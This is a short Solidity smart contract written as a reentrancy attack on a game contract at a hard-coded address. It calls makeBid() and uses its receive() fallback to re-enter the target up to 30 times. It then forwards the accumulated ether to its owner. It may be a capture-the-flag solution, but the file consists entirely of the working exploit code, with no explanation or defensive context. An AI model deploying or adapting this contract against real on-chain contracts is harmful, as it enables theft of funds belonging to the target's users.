pragma solidity ^0.8.0;

interface IGame {
    function makeBid() external payable;
}
contract GameReentrancy {
    IGame game = IGame(0x52d69c67536f55EfEfe02941868e5e762538dBD6);
    address private owner;
    uint256 reps;
    constructor() payable {
        owner = msg.sender;
    }
    function start() external payable {
        game.makeBid{value: 0.1 ether}();
        game.makeBid{value: 0.005 ether +1}();
    }
    receive() external payable {
        if (reps < 30) {
            reps++;
            game.makeBid{value: msg.value/20+1}();
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }
}
